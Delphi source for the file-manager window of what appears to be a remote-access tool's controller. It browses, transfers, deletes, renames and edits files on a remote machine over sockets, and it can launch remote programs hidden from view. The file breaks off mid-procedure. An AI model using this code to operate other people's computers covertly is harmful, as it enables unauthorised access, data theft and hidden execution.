unit UnitFileManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,Math,
  UnitFileTransfer,Menus, ImgList, ToolWin, ComCtrls , Jpeg, DateUtils,
  ClipBrd, UnitSharedData, shellapi,CommCtrl, UnitThumbDb, StrUtils, IniFiles;

type
  TFileManager = class(TForm)
    StatusBar1: TStatusBar;
    Splitter1: TSplitter;
    TreeView1: TTreeView;
    Panel1: TPanel;
    ListView1: TListView;
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    MenuItem1: TMenuItem;
    MenuItem7: TMenuItem;
    MenuItem8: TMenuItem;
    MenuItem9: TMenuItem;
    MenuItem11: TMenuItem;
    PopupMenu2: TPopupMenu;
    Update2: TMenuItem;
    Execute1: TMenuItem;
    Visible1: TMenuItem;
    Hidden1: TMenuItem;
    N1: TMenuItem;
    Parameters1: TMenuItem;
    Delete1: TMenuItem;
    Rename1: TMenuItem;
    Download1: TMenuItem;
    Upload1: TMenuItem;
    MenuItem2: TMenuItem;
    SetAsWallpaper1: TMenuItem;
    N4: TMenuItem;
    ShowThumbnails2: TMenuItem;
    Recycle1: TMenuItem;
    ImageList2: TImageList;
    ImageList3: TImageList;
    Timer1: TTimer;
    ProgressBar1: TProgressBar;
    OpenTray1: TMenuItem;
    Panel2: TPanel;
    Edit1: TComboBoxEx;
    DriveImageList: TImageList;
    ImageList5: TImageList;
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure ListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure TreeView1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure TreeView1DblClick(Sender: TObject);
    procedure TreeView1Edited(Sender: TObject; Node: TTreeNode;
      var S: String);
    procedure MenuItem1Click(Sender: TObject);
    procedure MenuItem7Click(Sender: TObject);
    procedure MenuItem8Click(Sender: TObject);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
    procedure MenuItem11Click(Sender: TObject);
    procedure Update2Click(Sender: TObject);
    procedure Parameters1Click(Sender: TObject);
    procedure Visible1Click(Sender: TObject);
    procedure Hidden1Click(Sender: TObject);
    procedure Delete1Click(Sender: TObject);
    procedure Rename1Click(Sender: TObject);
    procedure MenuItem2Click(Sender: TObject);
    procedure SetAsWallpaper1Click(Sender: TObject);
    procedure ShowThumbnails2Click(Sender: TObject);
    procedure Recycle1Click(Sender: TObject);
    procedure Download1Click(Sender: TObject);
    procedure Upload1Click(Sender: TObject);
    procedure MenuItem9Click(Sender: TObject);
    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure Timer1Timer(Sender: TObject);
    procedure StatusBar1DrawPanel(StatusBar: TStatusBar;
      Panel: TStatusPanel; const Rect: TRect);
    procedure FormResize(Sender: TObject);
    procedure OpenTray1Click(Sender: TObject);
    procedure ListView1ColumnClick(Sender: TObject; Column: TListColumn);
  private
    { Private declarations }
    ExtensionList: tstringlist;
    procedure AddAllFolders(Folders: string);
    procedure LoadDrives(Drives: string);
    procedure LoadFolders(Stream: TMemoryStream);
    procedure LoadFiles(Stream: TMemoryStream);
    procedure UpdateFileIcons;
  public
    { Public declarations }
    LastPath: string;
    IniFile: string;
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    LastNode: TTreeNode;
    DrivesLoaded: bool;
    Group,Computer,User: string;
    procedure ChangeDir;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
    procedure EnableControls(EnableControls: bool);
    procedure ClickTheColumn;

  end;

  TFileSearchRec = record
    FindData: TWIN32FindData;
    Path: string[255];
  end;

var
  FileManager: TFileManager;
  LastSortedColumn: TListColumn;
  Ascending: boolean;
  FileSizeList: TStringList;

implementation

uses UnitEditFile, UnitSettings, UnitScreenCapture, UnitTransferManager,
  UnitMain;

{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'FileManager|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TFileManager(SocketData.Form).NewSocket = nil then exit;
  TFileManager(SocketData.Form).Timer1.Enabled := True;
  TFileManager(SocketData.Form).NewSocket := nil;
  TFileManager(SocketData.Form).Caption := TFileManager(SocketData.Form).Caption + ' - [Offline]';
  //TFileManager(SocketData.Form).EnableControls(False);
end;

procedure ReceiveDataProc(Socket: TCustomWinSocket; Progress,Max: int64);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  TFileManager(SocketData.Form).ProgressBar1.Max := Max;
  TFileManager(SocketData.Form).ProgressBar1.Position := Progress;
end;

procedure TFileManager.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  SocketData.ReceiveDataProc := @ReceiveDataProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  if Treeview1.Items.Count = 4 then begin
    SendData(Socket,'DriveList');
    SendData(Socket,'FileList|' + Edit1.Text);
  end else begin
    EnableControls(True);
  end;
end;

procedure TFileManager.EnableControls(EnableControls: bool);
begin
  {Treeview1.Enabled := EnableControls;
  Edit1.Enabled := EnableControls;
  Listview1.Enabled := EnableControls;}
end;

{procedure TFileManager.LoadDrives(Drives: string);
var
  Tn: TTreeNode;
  Temp: string;
  DriveLetter,DriveType,TotalSpace,FreeSpace, DriveSpace: string;
begin
  LastNode := Treeview1.Items[0];
  LastNode.DeleteChildren;
  while Length(Drives) > 0 do begin

    DriveLetter := Split(Drives,'|',1);
    Delete(Drives,1,Length(DriveLetter)+1);

    DriveType := Split(Drives,'|',1);
    Delete(Drives,1,Length(DriveType)+1);

    FreeSpace := Split(Drives,'|',1);
    Delete(Drives,1,Length(FreeSpace)+1);

    Tn := Treeview1.Items.AddChild(LastNode,DriveLetter);
    case strtoint(DriveType) of
      DRIVE_UNKNOWN: Tn.ImageIndex := 0;
      DRIVE_REMOVABLE: Tn.ImageIndex := 1;
      DRIVE_FIXED: Tn.ImageIndex := 2;
      DRIVE_REMOTE: Tn.ImageIndex := 3;
      DRIVE_CDROM: Tn.ImageIndex := 4;
      DRIVE_RAMDISK: Tn.ImageIndex := 5;
    end;
    Tn.SelectedIndex := Tn.ImageIndex;
  end;
  LastNode.Expand(False);
end;}

function DriveTypeToStr(DriveType: integer): string;
begin
  case DriveType of
    DRIVE_UNKNOWN: Result := 'Unknown';
    DRIVE_REMOVABLE: Result := 'Removable';
    DRIVE_FIXED: Result := 'Fixed';
    DRIVE_REMOTE: Result := 'Remote';
    DRIVE_CDROM: Result := 'CD/DVD Rom';
    DRIVE_RAMDISK: Result := 'Ram';
  end;
end;

function StrToDriveType(DriveType: string): integer;
begin
  if DriveType = 'Unknown' then Result := 2;
  if DriveType = 'Removable' then Result := 3;
  if DriveType = 'Fixed' then Result := 4;
  if DriveType = 'Remote' then Result := 5;
  if DriveType = 'CD/DVD Rom' then Result := 6;
  if DriveType = 'Ram' then Result := 7;
end;


procedure TFileManager.LoadDrives(Drives: string);
var
  Tn: TTreeNode;
  Temp: string;
  DriveLetter,DriveType,DriveSpace,DriveAttrib,DateModded,VolumeName: string;
  TotalSize: int64;
  Li: TListItem;
  Stream: TMemoryStream;
begin
  Listview1.SmallImages := ImageList1;
  Listview1.LargeImages := ImageList5;
  FileSizeList.Clear;
  Edit1.Text := 'My Computer';


  LastNode := Treeview1.Items[0];
  LastNode.DeleteChildren;

  while Length(Drives) > 0 do begin

    DriveLetter := Split(Drives,'|',1);
    Delete(Drives,1,Length(DriveLetter)+1);

    DriveSpace := Split(Drives,'|',1);
    Delete(Drives,1,Length(DriveSpace)+1);
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(DriveSpace)^,length(DriveSpace));
    Stream.Position := 0;
    Stream.Read(TotalSize,sizeof(Int64));
    Stream.Free;

    DriveAttrib := Split(Drives,'|',1);
    Delete(Drives,1,Length(DriveAttrib)+1);

    DriveType := Split(Drives,'|',1);
    Delete(Drives,1,Length(DriveType)+1);

    VolumeName := Split(Drives,'|',1);
    Delete(Drives,1,Length(VolumeName)+1);

    Li := Listview1.Items.Add;
    Li.Caption := VolumeName + ' (' + Copy(DriveLetter,1,2) + ')';
    Li.SubItems.Add(FileSizeToStr(TotalSize));
    Li.SubItems.Add(DriveAttrib);
    Li.SubItems.Add(DriveTypeToStr(StrToInt(DriveType)));
    Li.SubItems.Add('');
    Li.StateIndex := FileSizeList.Add(inttostr(TotalSize));

    Tn := Treeview1.Items.AddChild(LastNode,DriveLetter);
    case strtoint(DriveType) of
      DRIVE_UNKNOWN: Tn.ImageIndex := 2;
      DRIVE_REMOVABLE: Tn.ImageIndex := 3;
      DRIVE_FIXED: Tn.ImageIndex := 4;
      DRIVE_REMOTE: Tn.ImageIndex := 5;
      DRIVE_CDROM: Tn.ImageIndex := 6;
      DRIVE_RAMDISK: Tn.ImageIndex := 7;
    end;
    Tn.SelectedIndex := Tn.ImageIndex;
    Li.ImageIndex := Tn.ImageIndex;



  end;
  LastNode.Expand(False);
end;

procedure TFileManager.ChangeDir;
begin
  SendData(NewSocket,'FileList|' + Edit1.Text);
end;

function FindNode(Caption: string; Treeview: TTreeview; node: TTreenode): TTreeNode;
var
  i: integer;
begin
  result := nil;
  if Node = nil then begin
    for i := 0 to treeview.Items.Count -1 do begin
      if uppercase(treeview.Items[i].Text) = uppercase(caption) then result := treeview.Items[i];
      //BREAK;
    end;
  end else begin
    for i := 0 to node.Count -1 do begin
      if uppercase(node.Item[i].Text) = uppercase(caption) then result := node.Item[i];
      //BREAK;
    end;
  end;
end;

procedure TFileManager.AddAllFolders(Folders: string);
var
  tmp: string;
  node: ttreenode;
begin
  lastnode := nil;
  while length(Folders) > 0 do begin
    tmp := Split(Folders,'\',1);
    delete(Folders,1,length(tmp)+1);
    if length(tmp) = 2 then tmp := tmp + '\';
    node := FindNode(tmp,Treeview1,LastNode);
    if node = nil then begin
      Node := Treeview1.Items.AddChild(LastNode,tmp);
      Node.ImageIndex := 8;
      Node.SelectedIndex := 8;
      Node.Expand(False);
    end else begin
      Node.Expand(False);
    end;
    if node.Parent <> nil then node.Parent.Expand(false);
    lastnode := node;
    lastnode.Expand(false);
  end;
end;


procedure TFileManager.LoadFolders(Stream: TMemoryStream);
var
  Tn: TTreeNode;
  FindData: TWIN32FindData;
begin
  Listview1.SmallImages := ImageList2;
  Listview1.LargeImages := ImageList3;
  LastNode.DeleteChildren;
  while Stream.Position < Stream.Size do begin
    Stream.ReadBuffer(FindData,SizeOf(TWIN32FindData));
    if string(FindData.cFileName) = '.' then Continue;
    if FindData.cFileName = '..' then Continue;
    Tn := Treeview1.Items.AddChild(LastNode,FindData.cFileName);
    Tn.ImageIndex := 8;
    Tn.SelectedIndex := 8;
  end;
  LastNode.Expand(False);
end;

function GetAttrib(FindData: TWIN32FindData):string;
begin
  Result := '';
  if FindData.dwFileAttributes and $00000020 <> 0 then Result := Result + 'A';
  if FindData.dwFileAttributes and $00000002 <> 0 then Result := Result + 'H';
  if FindData.dwFileAttributes and $00000001 <> 0 then Result := Result + 'R';
  if FindData.dwFileAttributes and $00000004 <> 0 then Result := Result + 'S';
end;

procedure TFileManager.UpdateFileIcons;
var
  i,ExtensionIndex: integer;
  SHFileInfo :TSHFileINfo;
  Bitmap: TBitmap;
  Icon: TIcon;
begin
  for i := ImageList2.Count -1 downto 2 do begin
    ImageList2.Delete(i);
  end;
  //ImageList2.Clear;

  ImageList3.Clear;

  if ExtensionList = nil then ExtensionList := TStringList.Create;
  ExtensionList.Clear;

  if not ShowThumbnails2.Checked then begin
    ExtensionList.Add('upArroW');
    ExtensionList.Add('downArroW');
  end;

  for i := 0 to Listview1.Items.Count -1 do begin
    ExtensionIndex := ExtensionList.IndexOf(Listview1.Items[i].SubItems[2]);

    if ExtensionIndex = -1 then begin
      ExtensionList.Add(Listview1.Items[i].SubItems[2]);

      if ShowThumbnails2.Checked then begin
        SHGetFileInfo(PChar(Listview1.Items[i].SubItems[2]),FILE_ATTRIBUTE_NORMAL, SHFileInfo, SizeOf(SHFileInfo), SHGFI_ICON or SHGFI_USEFILEATTRIBUTES );
      end else begin
        SHGetFileInfo(PChar(Listview1.Items[i].SubItems[2]),FILE_ATTRIBUTE_NORMAL, SHFileInfo, SizeOf(SHFileInfo), SHGFI_ICON or SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES );
      end;

      if ShowThumbnails2.Checked then begin
        Icon := TIcon.Create;
        Icon.Handle := SHFileInfo.hIcon;
        Bitmap := TBitmap.Create;
        Bitmap.Width := 128;
        Bitmap.Height := 128;
        try
          Bitmap.Canvas.Draw((Bitmap.Width div 2) - (Icon.Width div 2),(Bitmap.Height div 2) - (Icon.Height div 2),Icon);
        except
        end;
        Bitmap.Canvas.DrawFocusRect(Bitmap.Canvas.ClipRect);


        try
          ExtensionIndex := Imagelist3.Add(Bitmap,nil);
        except
          ExtensionIndex := -1;
        end;
        Icon.Free;
        Bitmap.Free;

      end else begin
        try
          ExtensionIndex := ImageList_AddIcon(ImageList2.Handle,SHFileInfo.hIcon);
        except
          ExtensionIndex := -1;
        end;
      end;


    end;

    Listview1.Items[i].ImageIndex := ExtensionIndex;
    if Pos('H',Listview1.Items[i].SubItems[1]) > 0 then Listview1.Items[i].Cut := True;

  end;

end;

function FileTimeToDateTime(FileTime : TFileTime) : TDateTime;
var
  LocalTime : TFileTime;
  SystemTime : TSystemTime;
begin
  Result := EncodeDate(1900,1,1);
  FileTimeToLocalFileTime(FileTime, LocalTime);
  FileTimeToSystemTime(LocalTime, SystemTime);
  Result := SystemTimeToDateTime(SystemTime);
end;

procedure TFileManager.LoadFiles(Stream: TMemoryStream);
var
  Li: TListItem;
  FindData: TWIN32FindData;
begin
  Listview1.Clear;
  FileSizeList.Clear;
  while Stream.Position < Stream.Size do begin
    Stream.ReadBuffer(FindData,SizeOf(TWIN32FindData));
    Li := Listview1.Items.Add;
    Li.Caption := FindData.cFileName;
    Li.SubItems.Add(FileSizeToStr(FindData.nFileSizeLow)); //inttostr(FindData.nFileSizeLow div 1024));
    Li.SubItems.Add(GetAttrib(FindData));
    Li.SubItems.Add(uppercase(extractfileext(FindData.cFileName)));
    Li.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftCreationTime)));
    Li.StateIndex := FileSizeList.Add(inttostr(FindData.nFileSizeLow));
  end;
end;

procedure TFileManager.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  Li: TListItem;
  Jpeg: TJpegImage;
  i: integer;
  Bmp,Bmp2: TBitmap;
  Rect: Trect;
  FileRec: TFileSearchRec;
  Path,Tmp,FileName: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'DriveList' then begin
    if Settings.CheckBox13.Checked then SaveDataToFile(SocketData.CachePath + 'Drives.cache',Data);
    LoadDrives(Data);
    DrivesLoaded := True;
    ClickTheColumn;
  end;

  if Command = 'FolderList' then begin
    while not DrivesLoaded do begin
      Sleep(1);
      Application.ProcessMessages;
    end;
    Command := Split(Data,'|',1);

    Path := Command;
    Path := AnsiReplaceStr(Path,':','');
    Path := AnsiReplaceStr(Path,'\','');
    if Settings.CheckBox13.Checked then SaveDataToFile(SocketData.CachePath + Path + '-Folders.cache',Data);
    Delete(Data,1,Length(Command)+1);

    //if Edit1.Items.IndexOf(Command) =1 -1 then Edit1.Items.Add(Command);
    Treeview1.Items.BeginUpdate;
    Edit1.Text := Command;
    AddAllFolders(Command);
    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(pointer(Data)^,Length(Data));
    Stream.Position := 0;
    if Stream.Size > 0 then LoadFolders(Stream);
    Stream.Free;
    Treeview1.Items.EndUpdate;
    ClickTheColumn;
  end;

  if Command = 'FileList' then begin

    Path := Edit1.Text;
    Path := AnsiReplaceStr(Path,':','');
    Path := AnsiReplaceStr(Path,'\','');
    if Settings.CheckBox13.Checked then SaveDataToFile(SocketData.CachePath + Path + '-Files.cache',Data);

    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(pointer(Data)^,Length(Data));
    Stream.Position := 0;
    Listview1.Items.BeginUpdate;
    LoadFiles(Stream);
    Stream.Free;
    UpdateFileIcons;
    ClickTheColumn;
    Listview1.Items.EndUpdate;

    Li := Listview1.FindCaption(0,'thumbs.db',False,True,False);

    if (Li <> nil) and (ShowThumbnails2.Checked) then begin

      if (Settings.CheckBox13.Checked) and (LoadDataFromStream(SocketData.CachePath + Path + '-Thumbs.cache',Data)) then begin
        ParseData(Socket,'GetThumbs|' + Data);
      end else begin
        SendData(Socket,'GetThumbs|' + Edit1.Text + 'thumbs.db');
      end;
    end;


  end;

  if Command = 'DownloadFolder' then begin
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,Length(Data));
    Stream.Position := 0;
    while Stream.Position < Stream.Size do begin
      Application.ProcessMessages;
      Stream.ReadBuffer(FileRec,SizeOf(TFileSearchRec));
      Li := ClientForm.FindTransferManager(MainSocket,SocketData).Listview1.Items.Add;
      Li.Caption := FileRec.FindData.cFileName;
      if Settings.CheckBox1.Checked then begin
        Tmp := FileRec.Path;
        Delete(Tmp,1,3);
        Li.SubItems.Add(SocketData.DownloadPath + Tmp + FileRec.FindData.cFileName);
      end else begin
        Li.SubItems.Add(SocketData.DownloadPath + FileRec.FindData.cFileName);
      end;
      Li.SubItems.Add(FileRec.Path + string(FileRec.FindData.cFileName));
      Li.SubItems.Add(FileSizeToStr(FileRec.FindData.nFileSizeLow));
      Li.SubItems.Add('0');
      Li.SubItems.Add('0');
      Li.SubItems.Add('00:00:00');
      Li.SubItems.Add('Pending');
      Li.ImageIndex := 18;
      Application.ProcessMessages;
    end;
    Stream.Free;
    Application.ProcessMessages;
  end;

  if Command = 'EditFile' then begin
    EditFile.Memo1.Text := Data;
    EditFile.ShowModal;
  end;

  if Command = 'GetThumbs' then begin

    Path := Edit1.Text;
    Path := AnsiReplaceStr(Path,':','');
    Path := AnsiReplaceStr(Path,'\','');
    SaveDataToFile(SocketData.CachePath + Path + '-Thumbs.cache',Data);

    FileName := SocketData.CachePath + Path + '-Thumbs.cache';

    Listview1.Items.BeginUpdate;
    for i := 0 to Listview1.Items.Count -1 do begin
      Jpeg := GetJpegThumb(FileName,Listview1.Items[i].Caption);
      if Jpeg = nil then Continue;
      Bmp := TBitmap.Create;
      Bmp.Assign(Jpeg);
      try
        if (Bmp.Width <> 128) or (Bmp.Height <> 128) then begin
          Bmp2 := TBitmap.Create;
          Bmp2.Width := 128;
          Bmp2.Height := 128;
          Rect.Left := (Bmp2.Width div 2) - (Bmp.Width div 2);
          Rect.Top := (Bmp2.Height div 2) - (Bmp.Height div 2);
          Bmp2.Canvas.Draw(Rect.Left,Rect.Top,Bmp);
          Listview1.Items[i].ImageIndex := ImageList3.Add(Bmp2,nil);
          Bmp2.Free;
        end else begin
          Listview1.Items[i].ImageIndex := ImageList3.Add(Bmp,nil);
        end;
      except
      end;
      Bmp.Free;
      Jpeg.Free;
    end;
    Listview1.Items.EndUpdate;
    EnableControls(True);
  end;


end;

procedure ConvertTo32BitImageList(const ImageList: TImageList);
const
  Mask: array[Boolean] of Longint = (0, ILC_MASK);
var
  TemporyImageList: TImageList;
begin
  if Assigned(ImageList) then
  begin
    TemporyImageList := TImageList.Create(nil);
    try
      TemporyImageList.Assign(ImageList);
      with ImageList do
      begin
        ImageList.Handle := ImageList_Create(Width, Height, ILC_COLOR32 or Mask[Masked], 0, AllocBy);
        if not ImageList.HandleAllocated then
        begin
          //raise EInvalidOperation.Create(SInvalidImageList);
        end;
      end;
      ImageList.AddImages(TemporyImageList);
    finally
      TemporyImageList.Free;
    end;
  end;
end;


procedure TFileManager.FormCreate(Sender: TObject);
var
  ProgressBarStyle: integer;
  i: integer;
  Bitmap: TBitmap;
  Icon: TIcon;
begin
  Ascending := True;
  LastSortedColumn := nil;
  StatusBar1.Panels[1].Style := psOwnerDraw;
  Progressbar1.Parent := Statusbar1;
  ProgressBarStyle := GetWindowLong(ProgressBar1.Handle,GWL_EXSTYLE);
  ProgressBarStyle := ProgressBarStyle - WS_EX_STATICEDGE;
  SetWindowLong(ProgressBar1.Handle,GWL_EXSTYLE,ProgressBarStyle);
  EnableControls(False);
  ConvertTo32BitImageList(ImageList2);

  FileSizeList := TStringList.Create;

  for i := 0 to DriveImageList.Count -1 do begin
    Icon := TIcon.Create;
    DriveImageList.GetIcon(i,Icon);
    Bitmap := TBitmap.Create;
    Bitmap.Width := 128;
    Bitmap.Height := 128;
    try
      Bitmap.Canvas.Draw((Bitmap.Width div 2) - (Icon.Width div 2),(Bitmap.Height div 2) - (Icon.Height div 2),Icon);
    except
    end;
    Bitmap.Canvas.DrawFocusRect(Bitmap.Canvas.ClipRect);
    ImageList5.Add(Bitmap,nil);
    Bitmap.Free;
    Icon.Free;
  end;


end;

procedure TFileManager.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
  Ini: TIniFile;
begin
  Action := caFree;

  Ini := TIniFile.Create(IniFile);
  Ini.WriteString('FileManager','LastPath',Edit1.Text);
  Ini.Free;

  if FileSizeList <> nil then FreeAndNil(FileSizeList);

  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

procedure TFileManager.ListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Listview1.ViewStyle = vsReport then Listview1.Canvas.Brush.Color := $F7F7F7;
end;

procedure TFileManager.TreeView1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  tmpNode: TTreeNode;
begin
  tmpNode := (Sender as TTreeView).GetNodeAt(MousePos.X, MousePos.Y);
  if tmpNode <> nil then TTreeView(Sender).Selected := tmpNode;
end;

function GetParentNode(Node: TTreenode): string;
var
  s: string;
begin
  s := Node.Text;
  while Node.Parent <> nil do begin
    result := includetrailingbackslash(Node.Parent.Text) + result;
    Node := Node.Parent;
  end;
  result := result + includetrailingbackslash(s);
end;

procedure TFileManager.TreeView1DblClick(Sender: TObject);
var
  Path: string;
  Data: string;
begin
  if not assigned(Treeview1.Selected) then exit;

  LastNode := Treeview1.Selected;

  if LastNode.Text = 'My Computer' then begin
    Edit1.Text := LastNode.Text;
    Listview1.Clear;
    Treeview1.Selected.DeleteChildren;

    if (Settings.CheckBox13.Checked) and (LoadDataFromStream(SocketData.CachePath + 'Drives.cache',Data)) then begin
      ParseData(nil,'DriveList|' + Data);
    end else begin
      SendData(NewSocket,'DriveList');
    end;

    exit;
  end;

  Path := GetParentNode(LastNode);
  Delete(Path,1,12);
  Edit1.Text := Path;
  Treeview1.Selected.DeleteChildren;
  EnableControls(False);

  if LastNode.Parent = nil then begin
    if LastNode.Text = 'Desktop' then Edit1.Text := SocketData.ServerData.DesktopDir;   //SendData(NewSocket,'FileList|%DESKTOP%');
    if LastNode.Text = 'My Documents' then Edit1.Text := SocketData.ServerData.MyDocuments; //SendData(NewSocket,'FileList|%MYDOCUMENTS%');
    if LastNode.Text = 'Application Data' then Edit1.Text := SocketData.ServerData.ApplicationData; //SendData(NewSocket,'FileList|%APPLICATIONDATA%');
  end;

  Path := Edit1.Text;
  Path := AnsiReplaceStr(Path,':','');
  Path := AnsiReplaceStr(Path,'\','');

  if (Settings.CheckBox13.Checked) and (LoadDataFromStream(SocketData.CachePath + Path + '-Folders.cache',Data)) then begin
    ParseData(nil,'FolderList|' + Data);
    LoadDataFromStream(SocketData.CachePath + Path + '-Files.cache',Data);
    ParseData(nil,'FileList|' + Data);
  end else begin
    SendData(NewSocket,'FileList|' + Edit1.Text);
  end;



end;

function GetFullPath(Node: TTreeNode): string;
begin
  Result := Node.Text;
  while Node.Parent <> nil do begin
    Node := Node.Parent;
    Result := IncludeTrailingBackSlash(Node.Text) + IncludeTrailingBackSlash(Result);
  end;
end;

procedure TFileManager.TreeView1Edited(Sender: TObject; Node: TTreeNode;
  var S: String);
var
  folder: string;
begin
  folder := excludetrailingbackslash(GetFullPath(Node));
  folder := extractfilepath(folder);
  folder := includetrailingbackslash(folder);
  Delete(Folder,1,12);
  SendData(NewSocket,'Rename|' + folder +  Node.Text + '|' + folder + s );
end;

procedure TFileManager.MenuItem1Click(Sender: TObject);
begin
  Update2.Click;
end;

procedure TFileManager.MenuItem7Click(Sender: TObject);
var
  Folder: string;
begin
  //if MsgBox('Delete File','Are you sure you want to delete.',MB_YESNO + MB_ICONWARNING + MB_APPLMODAL) <> 'Yes' then exit;
  Folder := excludetrailingbackslash(GetFullPath(Treeview1.Selected));
  Delete(Folder,1,12);
  Treeview1.Selected.Delete;
  SendData(NewSocket,'Delete|' + Folder);
end;


procedure TFileManager.MenuItem8Click(Sender: TObject);
begin
  Treeview1.Selected.EditText;
end;

procedure TFileManager.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
  Key := #0;
  {if Key = #13 then begin
    Update2.Click;
  end;}
end;

procedure TFileManager.MenuItem11Click(Sender: TObject);
var
  Name: string;
  node: ttreenode;
begin
  if lastnode = nil then exit;
  name := inputbox('New Folder','Enter New Folder Name','');
  if name = '' then exit;
  SendData(NewSOcket,'Create|' + Edit1.Text + includetrailingbackslash(Name));
  node := treeview1.Items.AddChild(LastNode,name);
  node.ImageIndex := 6;
  node.SelectedIndex := 6;
end;

procedure TFileManager.Update2Click(Sender: TObject);
var
  Path: string;
begin
  Path := Edit1.Text;
  Path := AnsiReplaceStr(Path,':','');
  Path := AnsiReplaceStr(Path,'\','');
  DeleteFile(SocketData.CachePath + Path + '-Folders.cache');
  DeleteFile(SocketData.CachePath + Path + '-Files.cache');
  DeleteFile(SocketData.CachePath + Path + '-Thumbs.cache');
  EnableControls(False);
  SendData(NewSocket,'FileList|' + Edit1.Text);
end;

procedure TFileManager.Parameters1Click(Sender: TObject);
begin
  Parameters1.Checked := not Parameters1.Checked;
end;

procedure TFileManager.Visible1Click(Sender: TObject);
var
  Number: integer;
  Param: string;
begin
  if Parameters1.Checked then Param := inputbox('Parameters','Enter Parameters','');
  for Number := 0 to ListView1.Items.Count -1 do begin
    if not listview1.Items[Number].Selected then continue;
    SendData(NewSocket,'Execute|' + Edit1.Text + listview1.Items[Number].Caption + '|' +  Param + '|' + inttostr(SW_SHOWNORMAL));
  end;
end;


procedure TFileManager.Hidden1Click(Sender: TObject);
var
  Number: integer;
  Param: string;
begin
  if Parameters1.Checked then Param := inputbox('Parameters','Enter Parameters','');
  for Number := 0 to ListView1.Items.Count -1 do begin
    if not listview1.Items[Number].Selected then continue;
    SendData(NewSocket,'Execute|' + Edit1.Text + listview1.Items[Number].Caption + '|' +  Param + '|' + inttostr(SW_HIDE));
  end;
end;

procedure TFileManager.Delete1Click(Sender: TObject);
var
  Number: integer;
begin
  for Number := ListView1.Items.Count -1 downto 0 do begin
    if not listview1.Items[Number].Selected then continue;
    SendData(NewSocket,'Delete|' + Edit1.Text + listview1.Items[Number].Caption);
    listview1.Items[Number].Delete;
  end;
end;

procedure TFileManager.Rename1Click(Sender: TObject);
var
  i: integer;
  filename: string;
  data: string;
  n: integer;
begin
  filename := inputbox('Rename File','Enter New File Name',Listview1.Selected.Caption);

  if Listview1.SelCount = 1 then begin
    data := 'Rename|' + Edit1.Text + Listview1.Selected.Caption + '|' + Edit1.Text + FileName;
    SendData(NewSocket,Data);
    exit;
  end;

  n := 0;
  for i := 0 to listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then Continue;
    data := 'Rename|' + Edit1.Text + Listview1.Items[i].Caption + '|' + Edit1.Text + '(' + inttostr(n) + ')' + FileName;
    Listview1.Items[i].Caption := '(' + inttostr(n) + ')' + FileName;
    inc(n);
    SendData(NewSocket,Data);
  end;

end;

procedure TFileManager.MenuItem2Click(Sender: TObject);
begin
  SendData(NewSocket,'EditFile|' + Edit1.Text + Listview1.Selected.Caption);
end;

procedure TFileManager.SetAsWallpaper1Click(Sender: TObject);
begin
  senddata(NewSocket,'SetWallpaper|' + Edit1.Text + Listview1.Selected.Caption);
end;

procedure TFileManager.ShowThumbnails2Click(Sender: TObject);
var
  Li: TListItem;
  i: integer;
  Path,Data: string;
begin
  ShowThumbnails2.Checked := not ShowThumbnails2.Checked;

  if Edit1.Text = 'My Computer' then begin
    if ShowThumbnails2.Checked then begin
      Listview1.ViewStyle := vsIcon;
      for i := 0 to Listview1.Items.Count -1 do begin

      end;
    end else begin
      Listview1.ViewStyle := vsReport;
      for i := 0 to Listview1.Items.Count -1 do begin
         Listview1.Items[i].ImageIndex := StrToDriveType(Listview1.Items[i].SubItems[2]);
      end;
    end;
    Exit;
  end;


  if ShowThumbnails2.Checked then begin
    Listview1.ViewStyle := vsIcon;
    UpdateFileIcons;
    Li := Listview1.FindCaption(0,'thumbs.db',false,True,False);

    if Li <> nil then begin
      //Statusbar1.Panels[0].Text := 'Retrieving Thumbs.db File';
      Path := Edit1.Text;
      Path := AnsiReplaceStr(Path,':','');
      Path := AnsiReplaceStr(Path,'\','');

      if (Settings.CheckBox13.Checked) and (LoadDataFromStream(SocketData.CachePath + Path + '-Thumbs.cache',Data)) then begin
        ParseData(nil,'GetThumbs|' + Data);
      end else begin
